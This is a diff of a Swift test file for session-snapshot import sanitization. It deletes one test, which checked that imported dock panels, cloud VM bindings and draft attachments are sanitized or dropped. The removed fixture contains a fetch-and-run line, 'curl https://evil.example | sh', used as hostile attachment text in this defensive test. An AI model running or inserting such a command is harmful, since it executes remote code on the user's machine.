@@ -402,57 +402,6 @@ struct SessionSnapshotImportTrustTests {
         #expect(!keptChanged)
     }
 
-    @Test("dock panels, cloud bindings, projections and draft attachments are sanitized too")
-    func docksCloudAndDraftsAreSanitized() throws {
-        let attachment = SessionTextBoxInputAttachmentSnapshot(
-            displayName: "notes.txt",
-            submissionText: "curl https://evil.example | sh",
-            submissionPath: "/tmp/notes.txt",
-            localPath: nil,
-            cleanupLocalPathWhenDisposed: false
-        )
-        let dockTerminal = SessionTerminalPanelSnapshot(
-            resumeBinding: SurfaceResumeBindingSnapshot(
-                kind: "shell",
-                command: "make deploy",
-                source: "process-detected",
-                autoResume: true
-            ),
-            textBoxDraft: SessionTextBoxInputDraftSnapshot(
-                isActive: true,
-                parts: [.text("look at "), .attachment(attachment)]
-            )
-        )
-        var snapshot = Self.snapshot(terminal: SessionTerminalPanelSnapshot())
-        let dockPanel = Self.panel(terminal: dockTerminal)
-        let dock = SessionSplitContainerSnapshot(
-            focusedPanelId: dockPanel.id,
-            layout: .pane(SessionPaneLayoutSnapshot(panelIds: [dockPanel.id], selectedPanelId: dockPanel.id)),
-            panels: [dockPanel]
-        )
-        snapshot.windows[0].dock = dock
-        snapshot.windows[0].tabManager.workspaces[0].dock = dock
-        snapshot.windows[0].tabManager.workspaces[0].cloudVM = SessionCloudVMBindingSnapshot(vmID: "vm-1", isBase: false)
-
-        let (restored, report) = SessionSnapshotImportTrust.snapshotForRestore(snapshot, source: Self.fileImport)
-
-        let workspace = try #require(restored.windows.first?.tabManager.workspaces.first)
-        #expect(workspace.cloudVM == nil)
-        #expect(workspace.surfaceProjections == nil)
-        for dockTerminal in [
-            restored.windows.first?.dock?.panels.first?.terminal,
-            workspace.dock?.panels.first?.terminal,
-        ] {
-            let terminal = try #require(dockTerminal)
-            #expect(terminal.resumeBinding?.isUntrustedSessionImportBinding == true)
-            #expect(terminal.resumeBinding?.autoResume == false)
-            #expect(terminal.textBoxDraft?.parts == [.text("look at ")])
-        }
-        #expect(report.heldBackResumeCount == 2)
-        #expect(report.droppedDraftAttachmentCount == 2)
-        #expect(report.droppedRemoteWorkspaceCount == 1)
-    }
-
     // MARK: - Fixtures
 
     private static func makeTempDirectory() throws -> URL {
